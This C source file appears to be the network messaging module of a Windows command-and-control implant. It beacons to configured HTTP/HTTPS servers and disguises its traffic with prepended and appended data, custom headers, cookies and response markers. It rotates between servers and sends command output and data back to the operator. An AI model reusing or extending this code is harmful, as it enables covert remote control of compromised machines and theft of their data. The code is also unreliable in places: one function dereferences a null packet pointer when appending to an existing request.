#ifdef _WIN32
#include <Windows.h>
#include <synchapi.h>
#endif

#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include "agent_http.h"
#include "agent_config.h"
#include "agent_utility.h"
#include "agent_protocol.h"
#include "cJSON.h"
#include "lz4.h"
#include "agent_commands.h"
#include "mbedtls/base64.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/ecdh.h"
#include "mbedtls/chacha20.h"
#include "mbedtls/sha256.h"

extern bool message_deserialize(session* sess, message* msg, size_t serialized_data_size, uint8_t* serialized_data);
extern bool message_serialize(session* sess, message* msg, size_t* serialized_data_size, uint8_t** serialized_data);

static bool send_to_server(char* server_type, cJSON* srv, session* sess, message* msg) {
	http_request* h_request = ZERO(http_request);
	http_response* h_response = ZERO(http_response);
	uint8_t* data = ZERO(uint8_t);

	// first, serialize the data	
	size_t data_size = 0;
	if (!message_serialize(sess, msg, &data_size, &data)) goto fail;

	if (!strcmp(server_type, "http") || !strcmp(server_type, "https")) {
		// check if mandatory fields are present
		cJSON* addr = cJSON_GetObjectItemCaseSensitive(srv, CONFIG_SERVER_ADDRESS);
		cJSON* port = cJSON_GetObjectItemCaseSensitive(srv, CONFIG_SERVER_PORT);
		cJSON* request = cJSON_GetObjectItemCaseSensitive(srv, CONFIG_SERVER_REQUEST);
		if (!addr || !port || !request) goto fail;

		// check for data to prepend or to append
		cJSON* jdata = cJSON_GetObjectItemCaseSensitive(request, CONFIG_SERVER_REQUEST_DATA);
		if (sess->is_established && jdata) {
			size_t prepend_size = 0;
			size_t append_size = 0;
			cJSON* jprepend = cJSON_GetObjectItemCaseSensitive(jdata, CONFIG_SERVER_REQUEST_DATA_PREPEND);
			cJSON* jappend = cJSON_GetObjectItemCaseSensitive(jdata, CONFIG_SERVER_REQUEST_DATA_APPEND);
			if (jprepend) prepend_size = strlen(jprepend->valuestring);
			if (jappend) append_size = strlen(jappend->valuestring);
			if (prepend_size || append_size) {
				uint8_t* new_data = MEM_ALLOC(prepend_size + append_size + data_size);
				if (!new_data) goto fail;
				if (prepend_size) {
					memcpy(new_data, jprepend->valuestring, prepend_size);
				}
				memcpy(new_data + prepend_size, data, data_size);
				if (append_size) {
					memcpy(new_data + prepend_size + data_size, jappend->valuestring, append_size);
				}
				FREE(data);

				// set the new value
				data = new_data;
				data_size = prepend_size + append_size + data_size;
			}
		}		

		cJSON* path = cJSON_GetObjectItemCaseSensitive(request, CONFIG_SERVER_REQUEST_PATH);
		cJSON* session_cookie = cJSON_GetObjectItemCaseSensitive(request, CONFIG_SERVER_REQUEST_SESSIONCOOKIE);
		if (!session_cookie || !path) goto fail;

		// set method
		char* h_method = ZERO(char);
		if (data_size > 0) {
			h_method = MEM_ALLOC(5);
			if (!h_method) goto fail;
			memcpy(h_method, "POST", 4);
		}
		else {
			h_method = MEM_ALLOC(4);
			if (!h_method) goto fail;
			memcpy(h_method, "GET", 3);
		}
		
		// set path
		char* h_path = _strdup(path->valuestring);

		// clone data
		uint8_t* h_data = MEM_ALLOC(data_size);
		memcpy(h_data, data, data_size);		

		// create request
		h_request = OBJ_ALLOC(http_request);
		if (!h_request) goto fail;		
		h_request->method = h_method;
		h_request->path = h_path;
		h_request->data_size = data_size;
		h_request->data = h_data;
		h_request->use_https = !strcmp(server_type, "https");
		
		// set request timeout equlas to the agent sleep time
		cJSON* jsession = cJSON_GetObjectItemCaseSensitive(sess->config, CONFIG_SESSION);
		if (jsession) {
			cJSON* jsleep = cJSON_GetObjectItemCaseSensitive(jsession, CONFIG_SESSION_SLEEP);
			h_request->timeout = jsleep->valueint;
		}
		
		// add headers
		cJSON* headers = cJSON_GetObjectItemCaseSensitive(request, CONFIG_SERVER_REQUEST_HEADERS);
		cJSON* header = ZERO(cJSON);
		cJSON_ArrayForEach(header, headers) {
			if (!http_add_header(h_request, header->child->string, header->child->valuestring)) goto fail;
		}

		// add cookies
		cJSON* cookies = cJSON_GetObjectItemCaseSensitive(srv, CONFIG_SERVER_REQUEST_COOKIES);
		cJSON* cookie = ZERO(cJSON);
		cJSON_ArrayForEach(cookie, cookies) {
			if (!http_add_cookie(h_request, cookie->child->string, cookie->child->valuestring)) goto fail;
		}

		// setup session info		
		if (!session_cookie) goto fail;
		if (!http_add_cookie(h_request, session_cookie->valuestring, sess->session_id)) goto fail;

		// send request
		h_response = http_send_request(h_request, addr->valuestring, port->valueint, sess->proxy);
		if (!h_response) goto fail;
		h_request = http_free_request(h_request);				

		// check response
		cJSON* status_code = ZERO(cJSON);
		cJSON* response = cJSON_GetObjectItemCaseSensitive(srv, CONFIG_SERVER_RESPONSE);
		if (response) {
			// check response status code
			status_code = cJSON_GetObjectItemCaseSensitive(response, CONFIG_SERVER_RESPONSE_STATUSCODE);
			if (status_code && status_code->valueint != h_response->status_code) goto fail;

			// check for start/end marker
			cJSON* jresponse_data = cJSON_GetObjectItemCaseSensitive(response, CONFIG_SERVER_RESPONSE_DATA);
			if (jresponse_data) {
				char* start_marker = ZERO(char);
				char* end_maker = ZERO(char);
				cJSON* jstart_marker = cJSON_GetObjectItemCaseSensitive(jresponse_data, CONFIG_SERVER_RESPONSE_DATA_START_MARKER);
				cJSON* jend_marker = cJSON_GetObjectItemCaseSensitive(jresponse_data, CONFIG_SERVER_RESPONSE_DATA_END_MARKER);

				ptrdiff_t start_offset = 0;
				ptrdiff_t end_offset = h_response->data_size;
				if (jstart_marker) {
					start_marker = strstr((char*)h_response->data, jstart_marker->valuestring);
					if (start_marker) {
						start_offset = start_marker - (char*)h_response->data + strlen(jstart_marker->valuestring);
						start_marker += strlen(jstart_marker->valuestring);
					}
				}

				if (jend_marker) {
					end_maker = rstrstr((char*)h_response->data, jend_marker->valuestring);
					if (end_maker) end_offset = end_maker - (char*)h_response->data;
				}

				size_t trimmed_size = end_offset - start_offset;
				if (trimmed_size != h_response->data_size) {
					char* trimmed_data = MEM_ALLOC(trimmed_size);
					if (!trimmed_data) goto fail;
					memcpy(trimmed_data, start_marker, trimmed_size);
					FREE(h_response->data);
					h_response->data = trimmed_data;
					h_response->data_size = trimmed_size;
				}
			}
		}

		// parse response and populate message response
		if(!message_deserialize(sess, msg, h_response->data_size, (uint8_t*)h_response->data)) goto fail;		
		
		h_response = http_free_response(h_response);
	}

	FREE(data);
	data = ZERO(uint8_t);
	return true;

fail:
	FREE(data);
	if (h_request) http_free_request(h_request);	
	if (h_response) http_free_response(h_response);
	return false;
}

bool message_send(session* sess, message* msg) {
#ifdef _WIN32
	EnterCriticalSection((LPCRITICAL_SECTION)sess->net_mutex);
#else
#error Mutex lock on non Windows platform is not supported
#endif

	// first check the active server
	if (sess->active_server) {
		if (!send_to_server(sess->active_server_type, sess->active_server, sess, msg)) {
			cJSON_Delete(sess->active_server);
			sess->active_server = ZERO(cJSON);
		}
	}

	if (!sess->active_server) {
		// try to find an active server
		cJSON* servers = cJSON_GetObjectItemCaseSensitive(sess->config, CONFIG_SERVER);
		cJSON* servers_type = ZERO(cJSON);
		cJSON* srv = ZERO(cJSON);		
		cJSON_ArrayForEach(servers_type, servers) {
			uint32_t index = 0;
			cJSON_ArrayForEach(srv, servers_type) {
				if (send_to_server(servers_type->string, srv, sess, msg)) {
					sess->active_server = cJSON_Duplicate(srv, true);
					if (!sess->active_server) goto fail;

					sess->active_server_index = index;
					sess->active_server_type = _strdup(servers_type->string);
					goto end;
				}
				index++;
			}			
		}
		goto fail;
	}	

end:
#ifdef _WIN32
	LeaveCriticalSection((LPCRITICAL_SECTION)sess->net_mutex);
#else
#error Mutex unlock on non Windows platform is not supported
#endif
	return true;

fail:
	sess->active_server = ZERO(cJSON);
#ifdef _WIN32
	LeaveCriticalSection((LPCRITICAL_SECTION)sess->net_mutex);
#else
#error Mutex unlock on non Windows platform is not supported
#endif
	return false;
}

bool message_add_request_data(
	message* msg, 
	size_t data_size, 
	void* data, 
	uint32_t id, 
	uint32_t seq, 
	uint32_t data_type, 
	uint32_t state, 
	bool force_add
) {
	// check if there are no data to add, in this case the packet is not created
	if (!data_size && !force_add) return true;

	packet* pck = ZERO(packet);
	if (!msg->request) {
		msg->request = OBJ_ALLOC(packet);
		if (!msg->request) goto fail;
		pck = msg->request;
	}
	else {
		packet* p = msg->request;
		while (p->next) p = p->next;
		p->next = pck;
	}	
	
	// fill packet
	pck->id = id;
	pck->sequence = seq;
	pck->data_type = data_type;
	pck->state = state;
	pck->data = MEM_ALLOC(data_size);
	if (!pck->data) return false;
	memcpy(pck->data, data, data_size);
	pck->data_size = data_size;
	
	return true;
fail:
	return false;
}

message* message_create(session* sess) {
	if (!sess->session_id || !sess->session_id_size) goto fail;

	message* msg = OBJ_ALLOC(message);
	if (!msg) goto fail;
	char* sess_id = MEM_ALLOC(sess->session_id_size);
	if (!sess_id) goto fail;
	memcpy(sess_id, sess->session_id, sess->session_id_size);
	msg->session_id = sess_id;
	msg->session_id_size = sess->session_id_size;
	return msg;

fail:
	return ZERO(message);
}

void message_packet_free(packet* ipck) {
	packet* pck = ipck;
	while (pck) {
		if (pck->data) FREE(pck->data);
		packet* t = pck;
		pck = pck->next;
		FREE(t);
	}
}

message* message_free(message* msg) {
	if (msg->session_id) {
		FREE(msg->session_id);
		msg->session_id = ZERO(char);
	}
	message_packet_free(msg->request);
	message_packet_free(msg->response);
	msg->request = ZERO(packet);
	msg->response = ZERO(packet);
	FREE(msg);
	return ZERO(message);
}

bool message_send_data_partial(session* sess, packet* pck, size_t buf_size, uint8_t* buffer) {
	message* msg = message_create(sess);
	if (!msg) goto fail;
	if (!message_add_request_data(
		msg,
		buf_size,
		buffer,
		pck->id,
		0,
		REQUEST_COMMANDDATA,
		PACKET_STATE_MORE_PACKETS,
		false
	)) goto fail;
	if (!message_send(sess, msg)) goto fail;

	// free resources	
	message_free(msg);
	return true;
fail:
	if (msg) message_free(msg);
	return false;
}

bool message_send_data(session* sess, packet* pck, size_t buf_size, uint8_t* buffer) {
	message* msg = message_create(sess);
	if (!msg) goto fail;
	if (!message_add_request_data(
		msg,
		buf_size,
		buffer,
		pck->id,
		0,
		REQUEST_COMMANDDATA,
		PACKET_STATE_NO_MORE_PACKETS,
		false
	)) goto fail;
	if (!message_send(sess, msg)) goto fail;

	// free resources	
	message_free(msg);
	return true;
fail:
	if (msg) message_free(msg);
	return false;
}

bool message_send_command_result(session* sess, packet* pck, char* result_string) {	
	bool result = false;	
	if (!result_string) goto exit;

	// send the message
	message* msg = message_create(sess);
	if (!msg) goto exit;
	if (!message_add_request_data(
		msg,
		strlen(result_string) + 1,
		result_string,
		pck->id,
		0,
		REQUEST_COMMANDCOMPLETED,
		PACKET_STATE_NO_MORE_PACKETS,
		false
	)) goto exit;
	if (!message_send(sess, msg)) goto exit;

	// free resources	
	message_free(msg);
	result = true;

exit:	
	return result;
}

packet* message_clone_packet(packet* pck) {
	packet* cloned_packet = OBJ_ALLOC(packet);
	cloned_packet->data = MEM_ALLOC(pck->data_size);
	memcpy(cloned_packet->data, pck->data, pck->data_size);
	cloned_packet->data_size = pck->data_size;
	cloned_packet->data_type = pck->data_type;
	cloned_packet->id = pck->id;
	cloned_packet->sequence = pck->sequence;
	cloned_packet->state = pck->state;
	if (pck->next)
		cloned_packet->next = message_clone_packet(pck->next);
	return cloned_packet;
}